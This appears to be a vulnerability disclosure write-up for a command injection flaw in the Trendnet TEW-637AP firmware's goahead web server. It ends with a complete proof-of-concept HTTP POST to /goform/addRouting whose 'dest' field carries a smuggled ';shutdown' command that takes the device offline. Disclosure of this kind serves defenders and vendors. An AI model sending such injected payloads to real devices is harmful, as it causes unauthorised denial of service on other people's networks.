# Trendnet TEW-637AP(V1.3.0.106) Contains Command injection vulnerability 

## overview

- Manufacturer's website information：https://www.trendnet.com/
- Firmware download address: https://www.trendnet.com/support/support-detail.asp?prod=145_TEW-637AP

## product information

TEW-637AP(V1.3.0.106)

![image-20220828224337173](readme.assets/image-20220828224337173.png)

## description

### 1. Vulnerability Details

The TEW-637AP(V1.3.0.106) contains a command injection vulnerability in file `/bin/goahead`. function`sub_424E10`

![image-20220828224853509](readme.assets/image-20220828224853509.png)

![image-20220828224839226](readme.assets/image-20220828224839226.png)

we can control var `v1` through POST parameter `dest`.Because of `strcat(v12, v2)`, we can control ,and the function calls `popen(v12, r)`, so there is a command injection vulnerability. 

### 2. Recurring loopholes and POC

In order to reproduce the vulnerability, the following steps can be followed:

1. Boot the firmware by qemu-system or other ways (real machine)
2. Attack with the following POC attacks

```
POST /goform/addRouting HTTP/1.1
Host: 192.168.0.50
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 12
Origin: http://192.168.0.50
Connection: close
Referer: http://192.168.0.50/wireless/wireless_mac_filtering.asp
Upgrade-Insecure-Requests: 1


dest=;shutdown
```

By sending this poc, we can cause dos 

![image-20220828225046587](readme.assets/image-20220828225046587.png)

